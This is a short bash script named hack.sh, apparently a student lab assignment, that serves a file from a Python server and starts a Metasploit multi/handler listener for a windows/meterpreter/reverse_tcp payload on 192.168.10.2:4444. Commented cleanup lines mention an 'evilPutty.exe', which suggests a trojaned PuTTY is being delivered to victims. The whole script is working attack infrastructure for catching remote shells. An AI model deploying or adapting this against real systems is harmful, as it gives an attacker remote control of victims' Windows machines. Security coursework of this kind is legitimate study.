#!/bin/bash
#  John Williams
#  105201054
#  Date: Fri. Oct. 12, 2018
#  Program: hack.sh

red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`



echo "${green}[*]Set ip address to static IP address ${reset}"
./change_ip.sh 192.168.10.2
service apache2 stop

echo "${green}[*]Start server here as background process ${reset}"
if [ `netstat -anp|grep 80 | grep python3 | awk '{print $7}' | awk -F '/' '{print $1}'` ] ; then 
kill -9 `netstat -anp|grep 80 | grep python | awk '{print $7}' | awk -F '/' '{print $1}'`
fi
python3 server.py &

echo "${green}[*]Make meta file to be ingested as instructions for metasploit ${reset}"
echo "
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.10.2
set LPORT 4444
exploit -j
" > meta



msfconsole -r meta

#rm -f meta
#rm -f evilPutty.exe
#rm -f putty.exe
#
#./change_ip.sh -r


